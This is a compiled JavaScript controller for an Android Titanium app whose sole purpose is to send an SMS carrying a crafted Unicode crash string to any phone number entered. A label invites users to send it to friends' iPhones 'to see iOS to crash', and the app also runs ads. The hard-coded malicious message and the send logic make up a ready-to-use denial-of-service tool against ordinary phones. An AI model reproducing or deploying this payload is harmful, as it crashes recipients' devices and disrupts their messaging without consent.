function Controller() {
    function doSend() {
        alertDialog.title = "Confirmation";
        alertDialog.message = "Send a danger SMS to phone number " + $.txtPhoneNumber.value + ".\r\nARE YOU SURE?";
        alertDialog.show();
    }
    require("alloy/controllers/BaseController").apply(this, Array.prototype.slice.call(arguments));
    this.__controllerPath = "index";
    arguments[0] ? arguments[0]["__parentSymbol"] : null;
    arguments[0] ? arguments[0]["$model"] : null;
    arguments[0] ? arguments[0]["__itemTemplate"] : null;
    var $ = this;
    var exports = {};
    var __defers = {};
    $.__views.index = Ti.UI.createWindow({
        backgroundColor: "black",
        backgroundImage: "default.png",
        id: "index"
    });
    $.__views.index && $.addTopLevelView($.__views.index);
    $.__views.vwForm = Ti.UI.createView({
        top: "50dp",
        width: "200dp",
        height: "160dp",
        backgroundColor: "white",
        borderColor: "black",
        borderWidth: "5dp",
        id: "vwForm"
    });
    $.__views.index.add($.__views.vwForm);
    $.__views.lblPhoneNumber = Ti.UI.createLabel({
        color: "#000",
        font: {
            fontSize: "12dp"
        },
        text: "Phone number:",
        left: "10dp",
        top: "10dp",
        id: "lblPhoneNumber"
    });
    $.__views.vwForm.add($.__views.lblPhoneNumber);
    $.__views.txtPhoneNumber = Ti.UI.createTextField({
        height: "45dp",
        font: {
            fontSize: "18dp"
        },
        keyboardType: Titanium.UI.KEYBOARD_NUMBER_PAD,
        left: "10dp",
        width: "180dp",
        top: "30dp",
        id: "txtPhoneNumber"
    });
    $.__views.vwForm.add($.__views.txtPhoneNumber);
    $.__views.btnSend = Ti.UI.createButton({
        height: "40dp",
        font: {
            fontSize: "12dp"
        },
        title: "SEND SMS",
        top: "80dp",
        id: "btnSend"
    });
    $.__views.vwForm.add($.__views.btnSend);
    doSend ? $.__views.btnSend.addEventListener("click", doSend) : __defers["$.__views.btnSend!click!doSend"] = true;
    $.__views.lblWarning = Ti.UI.createLabel({
        color: "#EC5800",
        font: {
            fontSize: "10dp"
        },
        text: "Have fun with friends sending a SMS to their iPhone and see iOS to crash!",
        textAlign: "center",
        left: "10dp",
        right: "10dp",
        bottom: "10dp",
        id: "lblWarning"
    });
    $.__views.vwForm.add($.__views.lblWarning);
    exports.destroy = function() {};
    _.extend($, $.__views);
    var smsMod = require("ti.android.sms");
    Ti.API.info("module is => " + smsMod);
    smsMod.addEventListener("complete", function(e) {
        Ti.API.info("Result: " + (e.success ? "success" : "failure") + " msg: " + e.resultMessage);
        var result = "unexpected result...";
        switch (e.result) {
          case smsMod.SENT:
            result = "SENT";
            break;

          case smsMod.DELIVERED:
            result = "DELIVERED";
            break;

          case smsMod.FAILED:
            result = "FAILED";
            break;

          case smsMod.CANCELLED:
            result = "CANCELLED";
        }
    });
    var alertDialog = Titanium.UI.createAlertDialog({
        buttonNames: [ "Yes", "No" ],
        cancel: 1
    });
    alertDialog.addEventListener("click", function(e) {
        if (e.cancel === e.index || true === e.cancel) return;
        if (0 === e.index) {
            var recipient = $.txtPhoneNumber.value;
            var text = "وُوُحخ ̷̴̐خ ̷̴̐خ ̷̴̐خ امارتيخ ̷̴̐خ‎";
            smsMod.sendSMS(recipient, text);
            $.vwForm.visible = false;
            setTimeout(function() {
                $.vwForm.visible = true;
                alert("SMS sent!");
            }, 3e3);
        }
    });
    var Admob = require("ti.admob");
    var adMobView = Admob.createView({
        publisherId: "ca-app-pub-8604525528725010/5869692922",
        testing: false,
        bottom: 0,
        adBackgroundColor: "FF8855",
        backgroundColorTop: "738000",
        borderColor: "#000000",
        textColor: "#000000",
        urlColor: "#00FF00",
        linkColor: "#0000FF"
    });
    $.index.add(adMobView);
    $.index.open();
    __defers["$.__views.btnSend!click!doSend"] && $.__views.btnSend.addEventListener("click", doSend);
    _.extend($, exports);
}

var Alloy = require("alloy"), Backbone = Alloy.Backbone, _ = Alloy._;

module.exports = Controller;